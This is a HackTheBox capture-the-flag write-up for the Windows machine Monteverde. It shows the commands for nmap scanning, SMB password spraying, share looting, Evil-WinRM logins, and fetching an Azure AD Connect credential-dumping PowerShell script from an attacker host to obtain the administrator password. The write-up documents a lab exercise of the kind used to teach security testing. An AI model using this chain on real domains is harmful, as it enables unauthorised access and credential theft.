# Monteverde's WriteUp
### Platform: HackTheBox | Difficulty: Medium | OS: Windows | IP: 10.10.10.172 

Monteverde is a medium Windows box which let you to learn something new about Azure AD. Getting user flag wasn’t a big deal to me, but the root was a pain in the neck.

I do nmap without any specific flag to scan all ports:

``` $ nmap -vvv -p- -oN pall.txt 10.10.10.172 ```

Then I cut those open ports and scan them with -sV -sC flags:

``` $ nmap -vvv -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49706,49774 -oN sCV-nmap.txt 10.10.10.172 ```
![01-svc-nmap](https://user-images.githubusercontent.com/62805453/85043467-ea680200-b17b-11ea-9a39-e70c65af50b3.png)

After scanning ports I use enum4linux to gather information as much as possible:
![02-enum4linux](https://user-images.githubusercontent.com/62805453/85043481-f05de300-b17b-11ea-9cdf-015330913a04.png)

The most valuable gathered information are usernames:

``` administrator, SABatchJobs, mhope, smorgan, dgalanos, guest, roleary, svc-ata, svc-bexec, svc-netapp ```

I decided to connect to the system via SMB by trying some username with most popular passwords, which was unsuccessful. Sometimes administrators use the same username and password,  so I put all usernames in a file and tried to check if any username:password are matched.

![03-msfconsole](https://user-images.githubusercontent.com/62805453/85043492-f358d380-b17b-11ea-9f8c-7c237635f537.png)

You can download the python tool from my github.

After finding the correct username and password I used smbclient and smbmap to find more information:

``` $ smbclient -U SABatchJobs -L //10.10.10.172 ```
![04-smbclient](https://user-images.githubusercontent.com/62805453/85043491-f358d380-b17b-11ea-8f46-174681ef0d31.png)

I checked all share folders one by one, and was able to find a valuable file in \\10.10.10.172\users$\mhope\ , so I downloaded it with get command:
![05-usersharename](https://user-images.githubusercontent.com/62805453/85043523-fb187800-b17b-11ea-8dd0-808d4441a85f.png)

I read the azure.xml file and found the password for user “mhope”:

``` $ cat azure.xml ```

One of the useful tools to log into a user account in windows systems is Evil-winrm, so I used it to access the mhope account. You can download Evil-winrm from the following address:
https://github.com/Hackplayers/evil-winrm

After I logged into the account I immediately grab the user flag:

``` $ ruby evil-winrm.rb -u mhope -p [password] -i 10.10.10.172 ```
![07-userflag](https://user-images.githubusercontent.com/62805453/85043529-fd7ad200-b17b-11ea-80fa-37ff36adde54.png)

Now it is time to escalate the privilege to root.

At first I download netcat from my Kali machine so that I have a more stable connection:
![08-nc64](https://user-images.githubusercontent.com/62805453/85044400-16d04e00-b17d-11ea-8287-9959d8fdfc0e.png)


First things that I do are knowing who I am in the system and look at directories and their subs for any valuable file.

``` Cmd> whoami /all ```
![09-whoami](https://user-images.githubusercontent.com/62805453/85044413-1cc62f00-b17d-11ea-8c91-12ccaf28f861.png)


``` ps> Get-childItem -Recurse . ```
![10-recurse](https://user-images.githubusercontent.com/62805453/85044422-20f24c80-b17d-11ea-8a82-f7bdeeecbc8a.png)


After looking at directories I found some files in “C:\users\mhope\.Azure” , which were rabbit holes and took lots of my time. But finally after surfing on the internet for Azure AD I found two pages which helped me to know Azure AD better and get a shell code to escalate the privilege.

https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/

https://blog.xpnsec.com/azuread-connect-for-redteam/

So I sent the shell code to the victim’s machine and ran it, but I got an error, then I searched for the error and found that there are something in line one and three that I should change! after playing with the code and surfing on the internet I faced this webpage:
https://docs.microsoft.com/en-us/sql/reporting-services/report-data/data-connections-data-sources-and-connection-strings-report-builder-and-ssrs?view=sql-server-ver15

First I removed “(@_xpn_) \n” from line one, and then changed the data source as the example of SQL server database on the local server:

``` $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(local);Initial Catalog=ADSync;” ```

But there was still something wrong and I wasn’t able to figure it out, that’s why I asked my friend to help me and he sent me this link:
https://stackoverflow.com/questions/25682703/connect-to-sql-server-database-from-powershell

By adding “integrated security=True” to the code, the problem should be solved:

``` $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(local);Initial Catalog=ADSync; Integrated Security=True" ```

So after I changed line three, I uploaded the code again to the victim’s machine and ran it, and finally I was able to run the code correctly and get the administrator’s password:

``` PS> Invoke-Webrequest -Uri “http://10.10.16.32:59800/azuread_decrypt_msol.ps1 -Outfile local.ps1 ```
![11-root-creds](https://user-images.githubusercontent.com/62805453/85044424-218ae300-b17d-11ea-8a87-446a326cb30f.png)


Now it is time to use Evil-winrm one more time to log into the system as Administrator and capture the root flag:

``` $ ruby evil-winrm.rb -u administrator -p '[password]' -i 10.10.10.172 ```
![12-root-flag](https://user-images.githubusercontent.com/62805453/85044427-2354a680-b17d-11ea-9560-c7a1541cbbef.png)


### THE END
